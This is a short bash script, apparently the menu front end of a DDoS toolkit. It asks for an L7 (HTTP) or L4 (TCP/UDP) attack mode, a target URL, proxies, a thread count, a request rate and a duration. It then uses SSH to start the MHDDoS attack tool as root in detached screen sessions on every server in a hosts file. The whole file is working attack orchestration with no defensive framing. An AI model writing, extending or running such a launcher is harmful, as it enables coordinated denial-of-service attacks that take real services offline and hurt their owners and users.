MENU_OPTION=$(dialog --title 'Attack type' --menu --stdout "Choose option:" 15 55 2 1 'L7 Attack - HTTP protocol' 2 'L4 Attack - TCP/UPD protocol' 3 'Back')

case $MENU_OPTION in

1)
    ATTACK_TYPE=$(bash "${SCRIPT_DIR}/menus/l7.sh")
    TARGET=$(bash "${SCRIPT_DIR}/menus/url.sh")
    SOCKS_TYPE=$(bash "${SCRIPT_DIR}/menus/socks_type.sh")
    THREADS=$(bash "${SCRIPT_DIR}/menus/threads.sh")
    PROXY_FILE=$(bash "${SCRIPT_DIR}/menus/proxy_file.sh")
    RPS=$(bash "${SCRIPT_DIR}/menus/rps.sh")
    DURATION=$(bash "${SCRIPT_DIR}/menus/duration.sh")

    clear
    printf "Starting L7 attack...\n"
    bash "$SCRIPT_DIR/runoverssh" root "screen -d -m python3 /root/MHDDoS/start.py $ATTACK_TYPE $TARGET $SOCKS_TYPE $THREADS $PROXY_FILE $RPS $DURATION" --hostsfile "$SCRIPT_DIR/hosts.txt"
    ;;

2)
    ATTACK_TYPE=$(bash "${SCRIPT_DIR}/menus/l4.sh")
    TARGET=$(bash "${SCRIPT_DIR}/menus/url.sh")
    THREADS=$(bash "${SCRIPT_DIR}/menus/threads.sh")
    DURATION=$(bash "${SCRIPT_DIR}/menus/duration.sh")
    SOCKS_TYPE=$(bash "${SCRIPT_DIR}/menus/socks_type.sh")
    PROXY_FILE=$(bash "${SCRIPT_DIR}/menus/proxy_file.sh")

    clear
    printf "Starting L4 attack...\n"
    bash "$SCRIPT_DIR/runoverssh" root "screen -d -m python3 /root/MHDDoS/start.py $ATTACK_TYPE $TARGET $THREADS $DURATION $SOCKS_TYPE $PROXY_FILE" --hostsfile "$SCRIPT_DIR/hosts.txt"
    ;;


3)
    exit 0
    ;;

esac